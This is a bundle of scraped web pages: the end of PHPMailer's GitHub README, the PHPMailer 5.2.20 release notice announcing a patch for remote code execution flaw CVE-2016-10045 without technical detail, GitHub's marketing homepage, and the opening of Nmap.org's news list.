## Contributing

Please submit bug reports, suggestions, and pull requests to the [GitHub issue tracker](https://github.com/PHPMailer/PHPMailer/issues).

We're particularly interested in fixing edge cases, expanding test coverage, and updating translations.

If you found a mistake in the docs, or want to add something, go ahead and amend the wiki – anyone can edit it.

If you have git clones from prior to the move to the PHPMailer GitHub organisation, you'll need to update any remote URLs referencing the old GitHub location with a command like this from within your clone:

```
git remote set-url upstream https://github.com/PHPMailer/PHPMailer.git
```

Please *don't* use the SourceForge or Google Code projects any more; they are obsolete and no longer maintained.

## Sponsorship

Development time and resources for PHPMailer are provided by [Smartmessages.net](https://info.smartmessages.net/), the world's only privacy-first email marketing system.

[![Smartmessages.net privacy-first email marketing logo](https://camo.githubusercontent.com/1c9fac2c126b7258d41730a8c94eabb309db7602733fd88358aa970284c4beca/68747470733a2f2f7777772e736d6172746d657373616765732e6e65742f696d672f736d6172746d657373616765732d6c6f676f2e737667)](https://info.smartmessages.net/)

Donations are very welcome, whether in beer 🍺, T-shirts 👕, or cold, hard cash 💰. Sponsorship through GitHub is a simple and convenient way to say "thank you" to PHPMailer's maintainers and contributors – just click the "Sponsor" button [on the project page](https://github.com/PHPMailer/PHPMailer). If your company uses PHPMailer, consider taking part in Tidelift's enterprise support programme.

## PHPMailer For Enterprise

Available as part of the Tidelift Subscription.

The maintainers of PHPMailer and thousands of other packages are working with Tidelift to deliver commercial
support and maintenance for the open-source packages you use to build your applications. Save time, reduce risk, and
improve code health, while paying the maintainers of the exact packages you
use. [Learn more.](https://tidelift.com/subscription/pkg/packagist-phpmailer-phpmailer?utm_source=packagist-phpmailer-phpmailer&utm_medium=referral&utm_campaign=enterprise&utm_term=repo)

## Changelog

See [changelog](/PHPMailer/PHPMailer/blob/master/changelog.md).

## History

* PHPMailer was originally written in 2001 by Brent R. Matzelle as a [SourceForge project](https://sourceforge.net/projects/phpmailer/).
* [Marcus Bointon](https://github.com/Synchro) (`coolbru` on SF) and Andy Prevost (`codeworxtech`) took over the project in 2004.
* Became an Apache incubator project on Google Code in 2010, managed by Jim Jagielski.
* Marcus created [his fork on GitHub](https://github.com/Synchro/PHPMailer) in 2008.
* Jim and Marcus decide to join forces and use GitHub as the canonical and official repo for PHPMailer in 2013.
* PHPMailer moves to [the PHPMailer organisation](https://github.com/PHPMailer) on GitHub in 2013.

### What's changed since moving from SourceForge?

* Official successor to the SourceForge and Google Code projects.
* Test suite.
* Continuous integration with GitHub Actions.
* Composer support.
* Public development.
* Additional languages and language strings.
* CRAM-MD5 authentication support.
* Preserves full repo history of authors, commits, and branches from the original SourceForge project.

## About

The classic email sending library for PHP

### Topics

[php](/topics/php "Topic: php")
[email](/topics/email "Topic: email")
[php-library](/topics/php-library "Topic: php-library")
[attachment](/topics/attachment "Topic: attachment")
[smtp](/topics/smtp "Topic: smtp")
[phpmailer](/topics/phpmailer "Topic: phpmailer")
[hacktoberfest](/topics/hacktoberfest "Topic: hacktoberfest")
[tls-support](/topics/tls-support "Topic: tls-support")
[xoauth2](/topics/xoauth2 "Topic: xoauth2")

### Resources

[Readme](#readme-ov-file)
### License

[LGPL-2.1 license](#LGPL-2.1-1-ov-file)
### Security policy

[Security policy](#security-ov-file)

[Activity](/PHPMailer/PHPMailer/activity)
[Custom properties](/PHPMailer/PHPMailer/custom-properties)
### Stars

[**21.2k**
stars](/PHPMailer/PHPMailer/stargazers)
### Watchers

[**887**
watching](/PHPMailer/PHPMailer/watchers)
### Forks

[**9.7k**
forks](/PHPMailer/PHPMailer/forks)
[Report repository](/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer&report=PHPMailer+%28user%29)

## [Releases 64](/PHPMailer/PHPMailer/releases)

[PHPMailer 6.9.3
Latest

Nov 24, 2024](/PHPMailer/PHPMailer/releases/tag/v6.9.3)
[+ 63 releases](/PHPMailer/PHPMailer/releases)

## Sponsor this project

* ![patreon](https://github.githubassets.com/assets/patreon-96b15b9db4b9.svg)
  [patreon.com/**marcusbointon**](https://patreon.com/marcusbointon)
* ![tidelift](https://github.githubassets.com/assets/tidelift-8cea37dea8fc.svg)
  [tidelift.com/funding/github/**packagist/phpmailer/phpmailer**](https://tidelift.com/funding/github/packagist/phpmailer/phpmailer)
* <https://marcus.bointon.com/donations/>

[Learn more about GitHub Sponsors](/sponsors)

## [Packages 0](/orgs/PHPMailer/packages?repo_name=PHPMailer)

No packages published

## [Used by 101k](/PHPMailer/PHPMailer/network/dependents)

[* ![@hermannTS2020](https://avatars.githubusercontent.com/u/77634439?s=64&v=4)
* ![@BlackHole1225](https://avatars.githubusercontent.com/u/153245896?s=64&v=4)
* ![@maxdesanta](https://avatars.githubusercontent.com/u/76093413?s=64&v=4)
* ![@DMelnikk](https://avatars.githubusercontent.com/u/101388153?s=64&v=4)
* ![@Keagee9](https://avatars.githubusercontent.com/u/148270780?s=64&v=4)
* ![@ahmadsopyan9](https://avatars.githubusercontent.com/u/30023031?s=64&v=4)
* ![@Ganir19](https://avatars.githubusercontent.com/u/138612129?s=64&v=4)
* ![@tejaslandge](https://avatars.githubusercontent.com/u/150010969?s=64&v=4)

+ 101,461](/PHPMailer/PHPMailer/network/dependents)

## [Contributors 269](/PHPMailer/PHPMailer/graphs/contributors)

[+ 255 contributors](/PHPMailer/PHPMailer/graphs/contributors)

## Languages

* [PHP
  99.4%](/PHPMailer/PHPMailer/search?l=php)
* [Shell
  0.6%](/PHPMailer/PHPMailer/search?l=shell)

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_181ad589_20250125_054104.html ===

[Skip to content](#start-of-content)

## Navigation Menu

Toggle navigation

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Freleases%2Ftag%2Fv5.2.20)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login?return_to=https%3A%2F%2Fgithub.com%2FPHPMailer%2FPHPMailer%2Freleases%2Ftag%2Fv5.2.20)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F%3Cuser-name%3E%2F%3Crepo-name%3E%2Freleases%2Fshow&source=header-repo&source_repo=PHPMailer%2FPHPMailer)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

[PHPMailer](/PHPMailer)
/
**[PHPMailer](/PHPMailer/PHPMailer)**
Public

* [Notifications](/login?return_to=%2FPHPMailer%2FPHPMailer) You must be signed in to change notification settings
* [Fork
  9.7k](/login?return_to=%2FPHPMailer%2FPHPMailer)
* [Star
   21.2k](/login?return_to=%2FPHPMailer%2FPHPMailer)

* [Code](/PHPMailer/PHPMailer/tree/v5.2.20)
* [Issues
  36](/PHPMailer/PHPMailer/issues)
* [Pull requests
  11](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects
  0](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

Additional navigation options

* [Code](/PHPMailer/PHPMailer/tree/v5.2.20)
* [Issues](/PHPMailer/PHPMailer/issues)
* [Pull requests](/PHPMailer/PHPMailer/pulls)
* [Discussions](/PHPMailer/PHPMailer/discussions)
* [Actions](/PHPMailer/PHPMailer/actions)
* [Projects](/PHPMailer/PHPMailer/projects)
* [Wiki](/PHPMailer/PHPMailer/wiki)
* [Security](/PHPMailer/PHPMailer/security)
* [Insights](/PHPMailer/PHPMailer/pulse)

1. [Releases](/PHPMailer/PHPMailer/releases)
2. [v5.2.20](/PHPMailer/PHPMailer/releases/tag/v5.2.20)

# PHPMailer 5.2.20

 Compare

Choose a tag to compare

Could not load tags

Nothing to show

[{{ refName }}
default](/PHPMailer/PHPMailer/compare/%7B%7B%20urlEncodedRefName%20%7D%7D...v5.2.20)

 Loading

[View all tags](/PHPMailer/PHPMailer/tags)

![@Synchro](https://avatars.githubusercontent.com/u/81561?s=40&v=4)
[Synchro](/Synchro)
released this
28 Dec 14:36

·
[1621 commits](/PHPMailer/PHPMailer/compare/v5.2.20...master)
to master
since this release

[v5.2.20](/PHPMailer/PHPMailer/tree/v5.2.20)

[`efde5ed`](/PHPMailer/PHPMailer/commit/efde5edb3da8e1d257e030e3c2d922c4de6e5d09)

# Important security update!

This release patches the critical vulnerability described in [CVE-2016-10045](https://web.nvd.nist.gov/view/vuln/detail?vulnId=CVE-2016-10045) a remote code execution vulnerability, responsibly reported by [Dawid Golunski](https://legalhackers.com/advisories/PHPMailer-Exploit-Remote-Code-Exec-CVE-2016-10045-Vuln-Patch-Bypass.html), and patched by Paul Buonopane ([@Zenexer](https://github.com/Zenexer)).

Possible side effect - complex sender addresses (such as those used in VERP addressing) may no longer work. We advise switching to the SMTP transport if you need that functionality, and it offers higher performance anyway.

## Please update your systems as soon as possible.

Additional notes on this incident are available [in the PHPMailer wiki](https://github.com/PHPMailer/PHPMailer/wiki/About-the-CVE-2016-10033-and-CVE-2016-10045-vulnerabilities).

Note that the vulnerability described in here likely affects many other projects in a similar way, so please practice responsible disclosure, and help project maintainers fix security issues.

 Assets
2

 Loading

All reactions

## Footer

© 2025 GitHub, Inc.

### Footer navigation

* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
* [Security](https://github.com/security)
* [Status](https://www.githubstatus.com/)
* [Docs](https://docs.github.com/)
* [Contact](https://support.github.com?tags=dotcom-footer)
* Manage cookies
* Do not share my personal information

You can’t perform that action at this time.



=== Content from github.com_3097fca9_20250126_062433.html ===

[Skip to content](#start-of-content)

GitHub Copilot is now available for free.
[Learn more](https://github.com/features/copilot/?utm_source=github&utm_medium=banner&utm_campaign=copilotfree-bannerheader)

## Navigation Menu

Toggle navigation

[Sign in](/login)

* Product

  + [GitHub Copilot
    Write better code with AI](https://github.com/features/copilot)
  + [Security
    Find and fix vulnerabilities](https://github.com/features/security)
  + [Actions
    Automate any workflow](https://github.com/features/actions)
  + [Codespaces
    Instant dev environments](https://github.com/features/codespaces)
  + [Issues
    Plan and track work](https://github.com/features/issues)
  + [Code Review
    Manage code changes](https://github.com/features/code-review)
  + [Discussions
    Collaborate outside of code](https://github.com/features/discussions)
  + [Code Search
    Find more, search less](https://github.com/features/code-search)

  Explore
  + [All features](https://github.com/features)
  + [Documentation](https://docs.github.com)
  + [GitHub Skills](https://skills.github.com)
  + [Blog](https://github.blog)
* Solutions

  By company size
  + [Enterprises](https://github.com/enterprise)
  + [Small and medium teams](https://github.com/team)
  + [Startups](https://github.com/enterprise/startups)
  + [Nonprofits](/solutions/industry/nonprofits)
  By use case
  + [DevSecOps](/solutions/use-case/devsecops)
  + [DevOps](/solutions/use-case/devops)
  + [CI/CD](/solutions/use-case/ci-cd)
  + [View all use cases](/solutions/use-case)

  By industry
  + [Healthcare](/solutions/industry/healthcare)
  + [Financial services](/solutions/industry/financial-services)
  + [Manufacturing](/solutions/industry/manufacturing)
  + [Government](/solutions/industry/government)
  + [View all industries](/solutions/industry)

  [View all solutions](/solutions)
* Resources

  Topics
  + [AI](/resources/articles/ai)
  + [DevOps](/resources/articles/devops)
  + [Security](/resources/articles/security)
  + [Software Development](/resources/articles/software-development)
  + [View all](/resources/articles)

  Explore
  + [Learning Pathways](https://resources.github.com/learn/pathways)
  + [White papers, Ebooks, Webinars](https://resources.github.com)
  + [Customer Stories](https://github.com/customer-stories)
  + [Partners](https://partner.github.com)
  + [Executive Insights](https://github.com/solutions/executive-insights)
* Open Source

  + [GitHub Sponsors
    Fund open source developers](/sponsors)
  + [The ReadME Project
    GitHub community articles](https://github.com/readme)
  Repositories
  + [Topics](https://github.com/topics)
  + [Trending](https://github.com/trending)
  + [Collections](https://github.com/collections)
* Enterprise

  + [Enterprise platform
    AI-powered developer platform](/enterprise)
  Available add-ons
  + [Advanced Security
    Enterprise-grade security features](https://github.com/enterprise/advanced-security)
  + [GitHub Copilot
    Enterprise-grade AI features](/features/copilot#enterprise)
  + [Premium Support
    Enterprise-grade 24/7 support](/premium-support)
* [Pricing](https://github.com/pricing)

Search or jump to...

# Search code, repositories, users, issues, pull requests...

Search

Clear

[Search syntax tips](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax)

# Provide feedback

We read every piece of feedback, and take your input very seriously.

Include my email address so I can be contacted

  Cancel

 Submit feedback

# Saved searches

## Use saved searches to filter your results more quickly

Name

Query

To see all available qualifiers, see our [documentation](https://docs.github.com/search-github/github-code-search/understanding-github-code-search-syntax).

  Cancel

 Create saved search

[Sign in](/login)

[Sign up](/signup?ref_cta=Sign+up&ref_loc=header+logged+out&ref_page=%2F&source=header-home)
Reseting focus

You signed in with another tab or window. Reload to refresh your session.
You signed out in another tab or window. Reload to refresh your session.
You switched accounts on another tab or window. Reload to refresh your session.

Dismiss alert

{{ message }}

# Build and ship software on a single, collaborative platform

Join the world’s most widely adopted AI-powered developer platform.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)
## GitHub features

A demonstration animation of a code editor using GitHub Copilot Chat, where the user requests GitHub Copilot to refactor duplicated logic and extract it into a reusable function for a given code snippet.

CodePlanCollaborateAutomateSecureCode

Build code quickly and more securely with GitHub Copilot embedded throughout your workflows.

## GitHub is used by

![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)![Shopify](https://github.githubassets.com/assets/shopify-3fed3011ac81.svg)![EY](https://github.githubassets.com/assets/ey-7434b194d68c.svg)![Figma](https://github.githubassets.com/assets/figma-04e0038c0fef.svg)![Duolingo](https://github.githubassets.com/assets/duolingo-ea3a0aa56fa5.svg)![New York Times](https://github.githubassets.com/assets/newyorktimes-9d76d7f338f5.svg)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-762f679589f2.svg)![American Airlines](https://github.githubassets.com/assets/american-airlines-a2b13c8fbe08.svg)![Ford](https://github.githubassets.com/assets/ford-2fb5195a4c7c.svg)![Mercedes Benz](https://github.githubassets.com/assets/mercedes-b9190458c80e.svg)![Société Générale](https://github.githubassets.com/assets/societe-generale-7a3414490494.svg)![Vodafone](https://github.githubassets.com/assets/vodafone-6e0f322de6cd.svg)![Philips](https://github.githubassets.com/assets/philips-8087a5f95f5c.svg)![SAP](https://github.githubassets.com/assets/sap-ea7dcd02e37d.svg)![Infosys](https://github.githubassets.com/assets/infosys-7587455de0bd.svg)![Spotify](https://github.githubassets.com/assets/spotify-591ecb426c1e.svg)Pause
## Accelerate performance

With GitHub Copilot embedded throughout the platform, you can simplify your toolchain, automate tasks, and improve the developer experience.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)A Copilot chat window with extensions enabled. The user inputs the @ symbol to reveal a list of five Copilot Extensions. @Sentry is selected from the list, which shifts the window to a chat directly with that extension. There are three sample prompts at the bottom of the chat window, allowing the user to Get incident information, Edit status on incident, or List the latest issues. The last one is activated to send the prompt: @Sentry List the latest issues. The extension then lists several new issues and their metadata.
### Work 55% faster.[Jump to footnote 1](#footnote-1) Increase productivity with AI-powered coding assistance, including code completion, chat, and more.

[Explore GitHub Copilot](/features/copilot)![Duolingo](https://github.githubassets.com/assets/logo-duolingo-14477f9e54a6.svg)

Duolingo boosts developer speed by 25% with GitHub Copilot

[Read customer story](/customer-stories/duolingo)![Gartner](https://github.githubassets.com/assets/logo-gartner-aa8c2e452b64.svg)

2024 Gartner® Magic Quadrant™ for AI Code Assistants

[Read report](https://www.gartner.com/doc/reprints?id=1-2IKO4MPE&ct=240819&st=sb)![](https://github.githubassets.com/assets/accordion-1-ce487d44c0bf.webp)![](https://github.githubassets.com/assets/accordion-2-730955545f07.webp)![](https://github.githubassets.com/assets/accordion-3-52ca331d22ea.webp)![](https://github.githubassets.com/assets/accordion-4-a26744b70ff7.webp)
### Automate any workflow

Optimize your process with simple and secured CI/CD.

A list of workflows displays a heading ‘45,167 workflow runs’ at the top. Below are five rows of completed workflows accompanied by their completion time and their duration formatted in minutes and seconds.[Discover GitHub Actions](/features/actions)
### Get up and running in seconds

Start building instantly with a comprehensive dev environment in the cloud.

A GitHub Codespaces setup for the landing page of a game called OctoInvaders. On the left is a code editor with some HTML and Javascript files open. On the right is a live render of the page. In front of this split editor window is a screenshot of two active GitHub Codespaces environments with their branch names and a button to ‘Create codespace on main.’[Check out GitHub Codespaces](/features/codespaces)
### Build on the go

Manage projects and chat with GitHub Copilot from anywhere.

Two smartphone screens side by side. The left screen shows a Notification inbox, listing issues and pull requests from different repositories like TensorFlow and GitHub’s OctoArcade octoinvaders. The right screen shows a new conversation in GitHub Copilot chat.[Download GitHub Mobile](/mobile)
### Integrate the tools you love

Sync with 17,000+ integrations and a growing library of Copilot Extensions.

A grid of fifty app tiles displays logos for integrations and extensions for companies like Stripe, Slack, and Docker. The tiles extend beyond the bounds of the image to indicate a wide array of apps. [Visit GitHub Marketplace](/marketplace)
## Built-in application security where found means fixed

Use AI to find and fix vulnerabilities—freeing your teams to ship more secure software faster.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)
### Apply fixes in seconds. Spend less time fixing vulnerabilities and more time building features with Copilot Autofix.

[Explore GitHub Advanced Security](/enterprise/advanced-security)![Copilot Autofix identifies vulnerable code and provides an explanation, together with a secure code suggestion to remediate the vulnerability.](https://github.githubassets.com/assets/hero-64ecd484397f.webp)

Solve security debt. Leverage AI-assisted security campaigns to reduce application vulnerabilities and zero-day attacks.

[Discover security campaigns](/enterprise/advanced-security)![A security campaign screen displays the campaign’s progress bar with 97% completed of 701 alerts. A total of 23 alerts are left with 13 in progress, and the campaign started 20 days ago. The status below shows that there are 7 days left in the campaign with a due date of November 15, 2024.](https://github.githubassets.com/assets/pillar-1-dd667a921f55.webp)

Dependencies you can depend on. Update vulnerable dependencies with supported fixes for breaking changes.

[Learn about Dependabot](/features/security/software-supply-chain)![List of dependencies defined in a requirements .txt file.](https://github.githubassets.com/assets/pillar-2-ff69e872920a.webp)

Your secrets, your business: protected.  Detect, prevent, and remediate leaked secrets across your organization.

[Read about secret scanning](/features/security/code)![GitHub push protection confirms and displays an active secret, and blocks the push.](https://github.githubassets.com/assets/pillar-3-0a063e2daae2.webp)
### 7x fastervulnerability fixes with GitHub[Jump to footnote 2](#footnote-2)

### 90% coverage[of alert types in all supported languages with Copilot Autofix](https://docs.github.com/en/code-security/code-scanning/managing-your-code-scanning-configuration/codeql-query-suites)

## Work together, achieve more

Collaborate with your teams, use management tools that sync with your projects, and code from anywhere—all on a single, integrated platform.

![](https://github.githubassets.com/assets/particles-de1dd20f3008.png)![A project management dashboard showing tasks for the ‘OctoArcade Invaders’ project, with tasks grouped under project phase categories like ‘Prototype,’ ‘Beta,’ and ‘Launch’ in a table layout. One of the columns displays sub-issue progress bars with percentages for each issue.](https://github.githubassets.com/assets/hero-961322485af6.webp)
### Your workflows, your way. Plan effectively with an adaptable spreadsheet that syncs with your work.

[Jump into GitHub Projects](/features/issues)“
> It helps us onboard new software engineers and get them productive right away. We have all our source code, issues, and pull requests in one place... GitHub is a complete platform that frees us from menial tasks and enables us to do our best work.

Fabian FaulhaberApplication manager at Mercedes-Benz

![](https://github.githubassets.com/assets/accordion-1-38ad6b6d1b20.webp)![](https://github.githubassets.com/assets/accordion-2-c0a62cfc31a1.webp)![](https://github.githubassets.com/assets/accordion-3-5d5d222f1830.webp)![](https://github.githubassets.com/assets/accordion-4-7abff9233556.webp)
### Keep track of your tasks

Create issues and manage projects with tools that adapt to your code.

Display of task tracking within an issue, showing the status of related sub-issues and their connection to the main issue.[Explore GitHub Issues](/features/issues)
### Share ideas and ask questions

Create space for open-ended conversations alongside your project.

A GitHub Discussions thread where a GitHub user suggests a power-up idea involving Hubot revealing a path and protecting Mona. The post has received 5 upvotes and several reactions. Below, three other users add to the discussion, suggesting Hubot could provide different power-ups depending on levels and appreciating the collaboration idea.[Discover GitHub Discussions](/features/discussions)
### Review code changes together

Create review processes that improve code quality and fit neatly into your workflow.

Two code review approvals by helios-ackmore and amanda-knox, which are followed by three successful checks for ‘Build,’ ‘Test,’ and ‘Publish.’[Learn about code review](/features/code-review)
### Fund open source projects

Become an open source partner and support the tools and libraries that power your work.

A GitHub Sponsors popup displays ‘$15,000 a month’ with a progress bar showing 87% towards a $15,000 goal.[Dive into GitHub Sponsors](/sponsors)
## From startups to enterprises, GitHub scales with teams of any size in any industry.

By industryBy sizeBy use caseBy industry

---

[![](https://github.githubassets.com/assets/figma-62d390a52419.webp)![Figma](https://github.githubassets.com/assets/figma-9b0c642e96b8.svg)Technology

Figma streamlines development and strengthens security

Read customer story](https://github.com/customer-stories/figma)[![](https://github.githubassets.com/assets/mercedes-benz-d8f89b041561.webp)![Mercedes-Benz](https://github.githubassets.com/assets/mercedes-benz-60ddd54043e7.svg)Automotive

Mercedes-Benz standardizes source code and automates onboarding

Read customer story](https://github.com/customer-stories/mercedes-benz)[![](https://github.githubassets.com/assets/mercado-libre-579cb5447302.webp)![Mercado Libre](https://github.githubassets.com/assets/mercado-libre-2d6d610fa873.svg)Financial services

Mercado Libre cuts coding time by 50%

Read customer story](https://github.com/customer-stories/mercado-libre)[Explore customer stories](/customer-stories)

---

[View all solutions](/solutions)
## Millions of developers and businesses call GitHub home

Whether you’re scaling your development process or just learning how to code, GitHub is where you belong. Join the world’s most widely adopted AI-powered developer platform to build the technologies that redefine what’s possible.

Enter your emailSign up for GitHub[Try GitHub Copilot](/features/copilot)
## Footnotes

1. [Survey: The AI wave continues to grow on software development teams, 2024.](https://github.blog/news-insights/research/survey-ai-wave-grows/)
2. This 7X times factor is based on data from the industry’s longest running analysis of fix rates Veracode State of Software Security 2023, which cites the average time to fix 50% of flaws as 198 days vs. GitHub’s fix rates of 72% of flaws with in 28 days which is at a minimum of 7X faster when compared.

## Site-wide Links

### Subscribe to our developer newsletter

Get tips, technical guides, and best practices. Twice a month. Right in your inbox.

[Subscribe](https://resources.github.com/newsletter/)

### Product

* [Features](/features)
* [Enterprise](/enterprise)
* [Copilot](/features/copilot)
* [Security](/security)
* [Pricing](/pricing)
* [Team](/team)
* [Resources](https://resources.github.com)
* [Roadmap](https://github.com/github/roadmap)
* [Compare GitHub](https://resources.github.com/devops/tools/compare)

### Platform

* [Developer API](https://docs.github.com/get-started/exploring-integrations/about-building-integrations)
* [Partners](https://partner.github.com)
* [Education](https://github.com/edu)
* [GitHub CLI](https://cli.github.com)
* [GitHub Desktop](https://desktop.github.com)
* [GitHub Mobile](https://github.com/mobile)

### Support

* [Docs](https://docs.github.com)
* [Community Forum](https://github.community)
* [Professional Services](https://services.github.com)
* [Premium Support](/enterprise/premium-support)
* [Skills](https://skills.github.com)
* [Status](https://www.githubstatus.com)
* [Contact GitHub](https://support.github.com?tags=dotcom-footer)

### Company

* [About](https://github.com/about)
* [Customer stories](/customer-stories?type=enterprise)
* [Blog](https://github.blog)
* [The ReadME Project](/readme)
* [Careers](https://github.careers)
* [Newsroom](/newsroom)
* [Inclusion](/about/diversity)
* [Social Impact](https://socialimpact.github.com)
* [Shop](https://shop.github.com)

* © 2025 GitHub, Inc.
* [Terms](https://docs.github.com/site-policy/github-terms/github-terms-of-service)
* [Privacy](https://docs.github.com/site-policy/privacy-policies/github-privacy-statement)
  ([Updated 02/2024](https://github.com/github/site-policy/pull/582))
* [Sitemap](/sitemap)
* [What is Git?](/git-guides)
* Manage cookies
* Do not share my personal information

* [GitHub on LinkedIn](https://www.linkedin.com/company/github)
* [Instagram
  GitHub on Instagram](https://www.instagram.com/github)
* [GitHub on YouTube](https://www.youtube.com/github)
* [GitHub on X](https://x.com/github)
* [TikTok
  GitHub on TikTok](https://www.tiktok.com/%40github)
* [Twitch
  GitHub on Twitch](https://www.twitch.tv/github)
* [GitHub’s organization on GitHub](https://github.com/github)

You can’t perform that action at this time.



=== Content from nmap.org_9ba698e9_20250126_062512.html ===

[![](/shared/images/nst-icons.svg#menu)](#menu)
![](/shared/images/nst-icons.svg#close)
[![Home page logo](/images/sitelogo.png)](/)
[Nmap.org](https://nmap.org/)
[Npcap.com](https://npcap.com/)
[Seclists.org](https://seclists.org/)
[Sectools.org](https://sectools.org)
[Insecure.org](https://insecure.org/)

![](/shared/images/nst-icons.svg#search)

[Download](/download.html)
[Reference Guide](/book/man.html)
[Book](/book/)
[Docs](/docs.html)
[Zenmap GUI](/zenmap/)
[In the Movies](/movies/)

[Get Nmap 7.95 here](/download)
## News

* Nmap.org has been redesigned! Our new mobile-friendly layout is also on [Npcap.com](https://npcap.com),
  [Seclists.org](https://seclists.org),
  [Insecure.org](https://insecure.org), and
  [Sectools.org](https://sectools.org).* Nmap 7.90 has been released with Npcap 1.00 along with dozens of other performance improvements, bug fixes, and feature enhancements! [[Release Announcement](https://seclists.org/nmap-announce/2020/1) | [Download page](https://nmap.org/download.html)]* After more than 7 years of development and 170 public pre-releases, we're delighted to announce Npcap version 1.00! [[Release Announcement](https://seclists.org/nmap-announce/2020/0) | [Download page](https://nmap.org/npcap/)]* Nmap 7.80 was released for DEFCON 27! [[release notes](https://seclists.org/nmap-announce/2019/0) | [download](https://nmap.org/download.html)]* Nmap turned 20 years old on September 1, 2017! Celebrate by reading [the original Phrack #51 article](/p51-11.html). [#Nmap20](https://twitter.com/hashtag/Nmap20)!* Nmap 7.50 is now available! [[release notes](https://seclists.org/nmap-announce/2017/3) | [download](https://nmap.org/download.html)]* Nmap 7 is now available! [[release notes](/7/) | [download](https://nmap.org/download.html)]* We're pleased to release our new and Improved [Icons of the Web](/favicon/) project—a 5-gigapixel 